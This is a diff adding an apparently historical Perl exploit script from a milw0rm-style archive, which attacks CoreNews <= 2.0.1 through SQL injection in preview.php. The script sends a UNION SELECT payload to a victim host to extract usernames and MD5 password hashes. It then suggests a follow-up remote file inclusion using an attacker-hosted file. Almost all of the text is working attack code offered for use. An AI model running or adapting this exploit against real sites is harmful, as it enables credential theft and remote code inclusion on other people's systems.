@@ -1,0 +1,62 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=24
+#Usage: corenews.pl <host> <path>
+use IO::Socket;
+if(@ARGV != 2) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-24\r\n";
+  print "- CoreNews <= 2.0.1 Remote SQL Injection Exploit\r\n";
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to CoreNews ex: /corenews/\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $cnserver = $ARGV[0];
+  $cnserver =~ s/(http:\/\/)//eg;
+  $cnhost   = "http://".$cnserver;
+  $cndir    = $ARGV[1];
+  $cnport   = "80";
+  $cntar    = "preview.php?userid=";
+  $cnxp     = "-1/**/UNION/**/SELECT/**/null,concat(2022,login,20223,password,2203),null,null,null,null/**/FROM/**/corenews_users/*";
+  $cnreq    = $cnhost.$cndir.$cntar.$cnxp;
+  #Sending data...
+  header();
+  print "- Trying to connect: $cnserver\r\n";
+  $cn = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$cnserver", PeerPort => "$cnport") || die "- Connection failed...\n";
+  print $cn "GET $cnreq HTTP/1.1\n";
+  print $cn "Accept: */*\n";
+  print $cn "Referer: $cnhost\n";
+  print $cn "Accept-Language: tr\n";
+  print $cn "User-Agent: NukeZilla\n";
+  print $cn "Cache-Control: no-cache\n";
+  print $cn "Host: $cnserver\n";
+  print $cn "Connection: close\n\n";
+  print "- Connected...\r\n";
+  while ($answer = <$cn>) {
+    if ($answer =~ /2022(.*?)20223([\d,a-f]{32})2203/) {
+      print "- Exploit succeed!\r\n";
+      print "- Username: $1\r\n";
+      print "- MD5 HASH of PASSWORD: $2\r\n";
+      print "- If you crack hash you can use RFI with example ->\r\n";
+      print "- Example: $cnhost$cndir?show=http://yourhost.com/file.txt\r\n"; 
+      exit();
+    }
+  }
+  #Exploit failed...
+  print "- Exploit failed\n"
+}
+
+# nukedx.com [2006-04-21]
+
+# milw0rm.com [2006-04-21]
